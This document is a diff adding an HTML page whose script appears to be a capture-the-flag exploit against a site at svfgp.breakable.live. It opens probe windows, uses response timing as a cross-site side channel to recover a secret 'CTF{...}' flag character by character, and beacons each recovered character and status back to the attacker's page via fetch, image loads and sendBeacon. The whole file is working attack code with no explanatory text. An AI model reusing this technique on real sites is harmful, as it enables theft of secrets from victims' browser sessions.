@@ -1,0 +1,65 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"></head><body><script>
+var T="https://svfgp.breakable.live";
+var W=location.href.split("?")[0];
+var THR=2000;
+var known="CTF{";
+var HEX="0123456789abcdef";
+
+function exfil(d){
+  var u=W+"?d="+encodeURIComponent(d)+"&t="+Date.now();
+  try{fetch(u,{mode:"no-cors",cache:"no-store"}).catch(function(){});}catch(e){}
+  try{var i=new Image();i.src=u;}catch(e){}
+  try{navigator.sendBeacon(u,"");}catch(e){}
+}
+
+exfil("LOADED");
+
+function probe(cand){
+  return new Promise(function(res){
+    var sid=Date.now()+"-"+Math.random().toString(36).slice(2);
+    var rid=Math.random().toString(36).slice(2);
+    var u=T+"/?mode=probe&q="+encodeURIComponent(cand)+"&sid="+encodeURIComponent(sid)+"&rid="+encodeURIComponent(rid);
+    var t0=Date.now();
+    var w;
+    try{w=window.open(u,"_blank");}catch(e){exfil("OPEN_ERR:"+e.message);res(0);return;}
+    if(!w){exfil("OPEN_NULL:"+cand);res(0);return;}
+    var done=false;
+    function finish(ms){if(done)return;done=true;try{w.close();}catch(e){}res(ms);}
+    function handler(e){
+      if(e.data&&e.data.type==="svfgp-probe-done"&&e.data.sid===sid){
+        window.removeEventListener("message",handler);
+        finish(Date.now()-t0);
+      }
+    }
+    window.addEventListener("message",handler);
+    setTimeout(function(){window.removeEventListener("message",handler);finish(Date.now()-t0);},20000);
+  });
+}
+
+async function findChar(prefix){
+  var chars=prefix.length>=4+64?["}"]:HEX.split("");
+  exfil("PROBING_POS:"+(prefix.length-4)+"_n:"+chars.length);
+  var results=await Promise.all(chars.map(async function(c){
+    var t=await probe(prefix+c);
+    return{c:c,t:t};
+  }));
+  results.sort(function(a,b){return b.t-a.t;});
+  exfil("POS"+(prefix.length-4)+"_TOP:"+results.slice(0,3).map(function(r){return r.c+"="+r.t+"ms";}).join(","));
+  if(results[0].t>THR)return results[0].c;
+  return null;
+}
+
+async function run(){
+  exfil("START:"+known);
+  while(!known.endsWith("}")){
+    if(known.length===4+64){known+="}";break;}
+    var ch=null,tries=0;
+    while(!ch&&tries<2){ch=await findChar(known);tries++;}
+    if(!ch){exfil("STUCK:"+known);break;}
+    known+=ch;
+    exfil("FOUND:"+known);
+  }
+  exfil("DONE:"+known);
+}
+setTimeout(run,300);
+</script></body></html>
